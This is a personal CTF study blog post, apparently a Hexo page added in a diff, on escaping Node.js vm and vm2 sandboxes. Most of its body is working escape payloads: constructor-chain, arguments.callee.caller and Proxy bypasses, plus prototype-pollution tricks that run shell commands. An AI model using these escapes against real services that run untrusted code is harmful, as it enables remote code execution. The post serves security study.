@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Sandbox Escape | Lunatic&#39;s Workstation</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Study and research of sandbox escape">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sandbox Escape">
+<meta property="og:url" content="https://goodlunatic.github.io/2023/09/01/Sandbox%20Escape/index.html">
+<meta property="og:site_name" content="Lunatic&#39;s Workstation">
+<meta property="og:description" content="Study and research of sandbox escape">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-09-01T10:15:10.000Z">
+<meta property="article:modified_time" content="2023-09-01T10:16:44.371Z">
+<meta property="article:author" content="Lunatic">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Lunatic&#39;s Workstation" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Lunatic&#39;s Workstation</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/about">About</a>
+        
+          <a class="main-nav-link" href="/Friends">Friends</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://goodlunatic.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Sandbox Escape" class="article article-type-post" itemscope
+  itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/09/01/Sandbox%20Escape/" class="article-date">
+  <time datetime="2023-09-01T10:15:10.000Z" itemprop="datePublished">2023-09-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+    <header class="article-header">
+      
+  
+    <h1 class="article-title" itemprop="name">
+      Sandbox Escape
+    </h1>
+  
+
+    </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+      <div class="toc-parent">
+  <div id="toc" class="toc-article">
+    <div class="toc-title">目录</div>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#VM%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-text">VM沙箱逃逸</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#VM2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-text">VM2沙箱逃逸</span></a></li></ol>
+  </div>
+</div>
+      <p><strong>Study and research of sandbox escape</strong></p>
+<span id="more"></span>
+
+<h1 id="VM沙箱逃逸"><a href="#VM沙箱逃逸" class="headerlink" title="VM沙箱逃逸"></a>VM沙箱逃逸</h1><p>示例代码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入Nodejs标准库中的vm模块</span></span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line">sandbox = &#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;someone&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建一个沙箱对象，在这个上下文中执行的代码只能访问sandbox中的属性</span></span><br><span class="line">context = vm.<span class="title function_">createContext</span>(sandbox)</span><br><span class="line"><span class="comment">// vm.runInThisContext(code)：在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。可以访问到global上的全局变量，但是访问不到自定义的变量</span></span><br><span class="line"><span class="keyword">const</span> result = vm.<span class="title function_">runInThisContext</span>(<span class="string">&quot;process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)&quot;</span>, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result)</span><br></pre></td></tr></table></figure>
+
+<p>执行命令需要child_process模块，但是在沙箱环境中不能直接require引入child_process</p>
+<p>但是我们可以通过process对象获取</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="comment">//这里的this指向vm创建的context,然后通过原型链的方式拿到Function</span></span><br><span class="line"><span class="keyword">const</span> y1 = vm.<span class="title function_">runInNewContext</span>(<span class="string">`this.toString.constructor(&quot;return process&quot;)();`</span>);</span><br><span class="line"><span class="comment">//只要是外部的引用的特性，都可以用来获取并进行逃逸</span></span><br><span class="line"><span class="comment">//context = vm.createContext(&#123;a:[]&#125;)</span></span><br><span class="line"><span class="comment">//const result = vm.runInNewContext(`a.constructor.constructor(&quot;return process&quot;)()`,context);</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(y1.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;calc&#x27;</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>对以上代码的防护手段(将上下文对象的原型链设置为null)</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line">context = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> result = vm.<span class="title function_">runInNewContext</span>(<span class="string">`this.constructor.constructor(&quot;return process&quot;)()`</span>, context);</span><br><span class="line"><span class="comment">//原型对象设置为null，所以this就无法通过二次constructor获取Function的原型对象</span></span><br><span class="line">result.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;calc&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result)</span><br></pre></td></tr></table></figure>
+
+<p>针对上述防护的绕过方法</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 前置知识</span></span><br><span class="line"><span class="variable language_">arguments</span>是一个object对象，储存了每个调用函数中的相关参数</span><br><span class="line"><span class="variable language_">arguments</span>.<span class="property">callee</span>是<span class="variable language_">arguments</span>的一个成员，它的值是正在被执行的<span class="title class_">Function</span>对象</span><br><span class="line"><span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>调用当前函数的外层函数，如果是单函数无嵌套的话就是<span class="literal">null</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//绕过代码1——使用arguments.callee.caller实现绕过</span></span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title function_">runInContext</span>(<span class="string">`</span></span><br><span class="line"><span class="string">    function test()&#123;</span></span><br><span class="line"><span class="string">        const a = &#123;&#125;</span></span><br><span class="line"><span class="string">        a.toString = function () &#123;</span></span><br><span class="line"><span class="string">            //获取调用当前函数的函数</span></span><br><span class="line"><span class="string">            const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">            //利用函数的constructor来访问Function构造函数</span></span><br><span class="line"><span class="string">            //再次利用constructor来绕过沙箱限制获取process对象</span></span><br><span class="line"><span class="string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;).toString()</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        return a</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">	test();`</span>,</span><br><span class="line">    vm.<span class="title function_">createContext</span>(<span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>)));</span><br><span class="line"><span class="comment">// 强制将res转换为字符串，因此触发了tostring方法即我们上面自定义的tostring方法</span></span><br><span class="line"><span class="comment">// 从而绕过沙箱的限制实现了RCE</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;&quot;</span> + res)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//绕过代码2——使用VM沙箱Proxy代理绕过</span></span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="comment">//value是&#123;&#125;对象传入的，而&#123;&#125;对象在外部作用域下</span></span><br><span class="line"><span class="keyword">const</span> code3 = <span class="string">`new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">    set: function(me, key, value) &#123;</span></span><br><span class="line"><span class="string">        (value.constructor.constructor(&#x27;return process&#x27;))().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;).toString()</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;)`</span>;</span><br><span class="line"><span class="comment">//在特定的上下文中运行code3</span></span><br><span class="line">data = vm.<span class="title function_">runInContext</span>(code3, vm.<span class="title function_">createContext</span>(<span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>)));</span><br><span class="line"><span class="comment">//设置data对象的一个属性时，就会触发我们之前定义的Proxy对象的&quot;set&quot;拦截器</span></span><br><span class="line">data[<span class="string">&#x27;some_key&#x27;</span>] = &#123;&#125;;</span><br></pre></td></tr></table></figure>
+
+<h1 id="VM2沙箱逃逸"><a href="#VM2沙箱逃逸" class="headerlink" title="VM2沙箱逃逸"></a>VM2沙箱逃逸</h1><blockquote>
+<p>vm2基于vm开发，使用官方的vm库构建沙箱环境。然后使用JavaScript的Proxy技术来防止沙箱脚本逃逸</p>
+</blockquote>
+<p>VM2代码包中主要用到的四个文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cli.js:实现vm2的命令行调用</span><br><span class="line">contextify.js:封装了三个对象， Contextify 和 Decontextify ，并且针对 global 的Buffer类进行了代理</span><br><span class="line">main.js:vm2执行的入口，导出了 NodeVM, VM 这两个沙箱环境，还有一个 VMScript 实际上是封装了 vm.Script</span><br><span class="line">sandbox.js:针对 global 的一些函数和变量进行了hook，比如 setTimeout，setInterval 等</span><br></pre></td></tr></table></figure>
+
+<p>示例代码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//从vm2模块导入了两个主要的类：VM和VMScript</span></span><br><span class="line"><span class="keyword">const</span> &#123;<span class="variable constant_">VM</span>, <span class="title class_">VMScript</span>&#125; = <span class="built_in">require</span>(<span class="string">&quot;vm2&quot;</span>);</span><br><span class="line"><span class="comment">//使用VMScript创建脚本并在VM中执行</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(<span class="keyword">new</span> <span class="title class_">VMScript</span>(<span class="string">&quot;let a = 2;a&quot;</span>)));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//绕过代码</span></span><br><span class="line"><span class="comment">// 启用严格模式</span></span><br><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="comment">// 屏蔽原始的process对象</span></span><br><span class="line"><span class="keyword">var</span> process;</span><br><span class="line"><span class="comment">// 为所有对象添加了一个 has 方法</span></span><br><span class="line"><span class="comment">// 当这个新的 has 方法被调用时，它会尝试使用传入的对象 t 的构造函数来创建并返回 process 对象。</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">has</span> = <span class="keyword">function</span> (<span class="params">t, k</span>) &#123;</span><br><span class="line">    process = t.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;return process&quot;</span></span>)(<span class="params"></span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 触发原型链污染</span></span><br><span class="line"><span class="comment">// 这里使用了 in 运算符来检查空字符串 &quot;&quot; 是否为 Buffer.from 的一个属性。</span></span><br><span class="line"><span class="comment">// 这个检查会触发上面定义的 has 方法（因为 in 运算符在查找属性时会调用内部的[[HasProperty]] 方法，而这在某些情况下可以被 has 方法拦截）</span></span><br><span class="line"><span class="string">&quot;&quot;</span> <span class="keyword">in</span> <span class="title class_">Buffer</span>.<span class="property">from</span>;</span><br><span class="line">process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;whoami&quot;</span>).<span class="title function_">toString</span>()</span><br></pre></td></tr></table></figure>
+
+<p>js的三个属性：数据属性、访问器属性、内部属性</p>
+<blockquote>
+<p>数据属性和访问器属性都存在 <code>[[Enumerable]]</code> 和 <code>[[Configurable]]</code> 特性</p>
+<p><code>Enumerable </code>特性用于控制属性是否可以被 for…in 循环遍历以及是否可以通过 Object.keys()、Object.values()、Object.entries() 等方法获取到</p>
+<p><code>Configurable </code>特性用于控制属性是否可以被删除或修改。</p>
+</blockquote>
+<p>数据属性</p>
+<blockquote>
+<p>数据属性包含一个可以读取和写入属性值的变量，并且<code>Writable</code>控制这个值是否可改变，默认可改变</p>
+</blockquote>
+<p>访问器属性</p>
+<blockquote>
+<p>访问器属性不包含数据值，而是包含一对 getter 和 setter 函数，默认为<code>undefined</code></p>
+<p>设置对象的访问器属性，也就个get、set属性</p>
+</blockquote>
+<p>内部属性</p>
+<blockquote>
+<p>内部属性是 JavaScript 引擎内部使用的属性，不能直接访问它们</p>
+<p>例如：<code>Prototype</code>，想要访问<code>Prototype</code>得使用<code>__proto__</code></p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//绕过代码</span></span><br><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="comment">//启用严格模式，从vm2库中引入VM类</span></span><br><span class="line"><span class="keyword">const</span> &#123;<span class="variable constant_">VM</span>&#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"><span class="comment">//屏蔽原有的process对象</span></span><br><span class="line"><span class="comment">// Object.defineProperty() 是用于在对象上定义一个新属性，或修改已有的属性。</span></span><br><span class="line"><span class="comment">// 语法：Object.defineProperty(obj, prop, descriptor)</span></span><br><span class="line"><span class="comment">// 其中，obj 是需要定义属性的对象，</span></span><br><span class="line"><span class="comment">//		prop 是需要定义或修改的属性名，</span></span><br><span class="line"><span class="comment">//		descriptor 是一个 JavaScript 对象</span></span><br><span class="line"><span class="comment">//在Buffer.from(&quot;&quot;)对象上定义一个空字符串属性</span></span><br><span class="line"><span class="comment">//在Object.prototype上定义一个名为get的属性</span></span><br><span class="line"><span class="comment">//当访问这个get属性时，它会抛出一个异常，异常是一个函数，该函数能够返回process对象</span></span><br><span class="line"><span class="comment">//在异常处理中，代码通过e(() =&gt; &#123;&#125;)的形式来调用被篡改的Object.prototype.get方法，尝试获取到process对象。</span></span><br><span class="line"><span class="comment">//在这个过程中，篡改的Object.prototype.get方法会被调用，抛出一个返回process的函数，从而获取到process对象</span></span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">    Object.defineProperty(Buffer.from(&quot;&quot;), &quot;&quot;, &#123;get set()&#123;</span></span><br><span class="line"><span class="string">        Object.defineProperty(Object.prototype,&quot;get&quot;,&#123;get()&#123;</span></span><br><span class="line"><span class="string">            throw x=&gt;x.constructor(&quot;return process&quot;)();</span></span><br><span class="line"><span class="string">        &#125;&#125;);</span></span><br><span class="line"><span class="string">        return ()=&gt;&#123;&#125;;</span></span><br><span class="line"><span class="string">    &#125;&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">    process = e(()=&gt;&#123;&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require(&quot;child_process&quot;).execSync(&quot;id&quot;).toString();`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://goodlunatic.github.io/2023/09/01/Sandbox%20Escape/" data-id="clm0fycbs0031883zep4o4ves" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2023/09/01/CTF%E2%80%94%E2%80%94Web%E3%80%90%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%E3%80%91/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">CTF——Web【长期更新】</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/ACM/">ACM</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/BlockChain/">BlockChain</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">15</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Courses/">Courses</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Database/">Database</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hexo/">Hexo</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Language/">Language</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Raspberry-Pi/">Raspberry-Pi</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Skills/">Skills</a><span class="category-list-count">13</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUp/">WriteUp</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/">年终总结</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ACM/" style="font-size: 10px;">ACM</a> <a href="/tags/AWD/" style="font-size: 10px;">AWD</a> <a href="/tags/BlockChain/" style="font-size: 10px;">BlockChain</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Courses/" style="font-size: 13.33px;">Courses</a> <a href="/tags/Crypto/" style="font-size: 11.67px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Git/" style="font-size: 10px;">Git</a> <a href="/tags/Hexo/" style="font-size: 11.67px;">Hexo</a> <a href="/tags/Java/" style="font-size: 10px;">Java</a> <a href="/tags/JavaScript/" style="font-size: 10px;">JavaScript</a> <a href="/tags/Leetcode/" style="font-size: 10px;">Leetcode</a> <a href="/tags/Misc/" style="font-size: 15px;">Misc</a> <a href="/tags/Mysql/" style="font-size: 10px;">Mysql</a> <a href="/tags/Nodejs/" style="font-size: 10px;">Nodejs</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/Program/" style="font-size: 10px;">Program</a> <a href="/tags/Pwn/" style="font-size: 11.67px;">Pwn</a> <a href="/tags/Python/" style="font-size: 11.67px;">Python</a> <a href="/tags/Raspberry-Pi/" style="font-size: 10px;">Raspberry-Pi</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">SQL注入</a> <a href="/tags/Skills/" style="font-size: 18.33px;">Skills</a> <a href="/tags/Web/" style="font-size: 16.67px;">Web</a> <a href="/tags/WriteUp/" style="font-size: 10px;">WriteUp</a> <a href="/tags/forensics/" style="font-size: 10px;">forensics</a> <a href="/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/" style="font-size: 10px;">年终总结</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/09/01/Sandbox%20Escape/">Sandbox Escape</a>
+          </li>
+        
+          <li>
+            <a href="/2023/09/01/CTF%E2%80%94%E2%80%94Web%E3%80%90%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%E3%80%91/">CTF——Web【长期更新】</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/31/CTF%E2%80%94%E2%80%94Misc%E6%8C%87%E5%8D%97%E3%80%90%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%E3%80%91/">CTF——Misc指南【长期更新】</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/30/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%B8%8E%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">主从复制与逻辑漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/29/AWD%20Basic/">AWD Basic</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+    <div class="widget-wrap toc">
+  <h3 class="widget-title">Catalog</h3>
+  <div class="widget"></div>
+</div>
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 Lunatic<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+    <a href="/Friends" class="mobile-nav-link">Friends</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+<!-- Toc -->
+
+<script src="/js/toc.js"></script>
+
+<!-- Toc -->
+  </div>
+</body>
+</html>
